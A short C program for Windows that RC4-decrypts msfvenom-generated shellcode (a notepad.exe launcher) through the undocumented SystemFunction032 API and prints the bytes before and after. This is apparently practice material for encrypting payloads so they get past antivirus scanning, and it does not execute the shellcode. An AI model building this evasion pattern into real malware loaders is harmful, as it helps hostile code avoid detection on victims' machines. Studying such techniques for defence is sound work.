#include <windows.h>
#include <stdio.h>
#include "misc.h"


typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Data,
	struct USTRING* Key
	);

BOOL rc4sysfunc032(PBYTE pData, DWORD sDataSize, PBYTE pKey, DWORD sKeySize) {

	USTRING	Key = {
		.Buffer = pKey,
		.Length = sKeySize,
		.MaximumLength = sKeySize
	};

	USTRING Data = {
		.Buffer = pData,
		.Length = sDataSize,
		.MaximumLength = sDataSize
	};

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	if (SystemFunction032(&Data, &Key) != 0) {
		printError(L"SystemFunction032");
		return FALSE;
	}

	return TRUE;
}

int main()
{
	// msfvenom -p windows/exec CMD=notepad.exe -f c
	BYTE bufEnc[] =
		"\x7f\x68\x30\x9c\x81\x39\x96\x98\x71\x52\xa7\xca\x22\x8b\xbf\x61"
		"\x48\x50\x78\x5e\xea\x2a\x7c\x23\xfc\xb3\x5b\x72\x42\x27\x88\x03"
		"\x3b\xa6\xf8\x2f\x35\x50\x8f\x07\xcd\xb2\xf4\xa8\xe1\xaf\x30\xf3"
		"\x1f\x4c\xb3\x97\x19\x06\xc5\x12\x89\x8b\x44\x86\x21\xb3\x86\x7b"
		"\x05\x88\xc8\x01\xf4\x0d\x55\x91\x78\x23\xf9\x66\x81\x51\x67\x4b"
		"\x7b\x79\x9d\xdc\xfb\xe0\xd6\x5e\x13\xe1\xa6\x6d\xa6\x83\x5f\x61"
		"\x76\x40\xd1\xee\xdc\xe8\xdf\x5c\x46\x77\x48\x8f\x91\x13\xfa\xf5"
		"\xd2\xe2\x3d\x98\x21\xaa\xf9\xb9\xcc\xad\xca\xeb\x82\xf2\xe6\x0e"
		"\xe6\x9f\xdc\xd3\xe3\x04\x68\xb0\xb0\x3d\x1d\xfc\x16\xd8\xab\xf1"
		"\xde\xa0\x69\x3b\x74\xd6\xf8\x10\xda\x22\x2c\x96\xe8\x68\x71\x7e"
		"\xeb\xbb\x5d\x50\x4f\x81\x9d\x06\x7f\xf3\x13\xc7\x85\x95\xc7\xeb"
		"\xa0\x89\x62\x14\x4e\xa1\x0a\x6d\x23\x54\x83\x2d\xbf\xe1\xeb\xac"
		"\x78\xc4\x00\x14";

	DWORD sBufEnc = (sizeof(bufEnc) / sizeof(BYTE)) - 1;

	BYTE key[] = "\xAB\xCD\xEF\xF0\x0F";
	DWORD sKey = (sizeof(key) / sizeof(BYTE)) - 1;

	printHex(bufEnc, sBufEnc);

	rc4sysfunc032(bufEnc, sBufEnc, key, sKey);

	printHex(bufEnc, sBufEnc);


	return 0;
}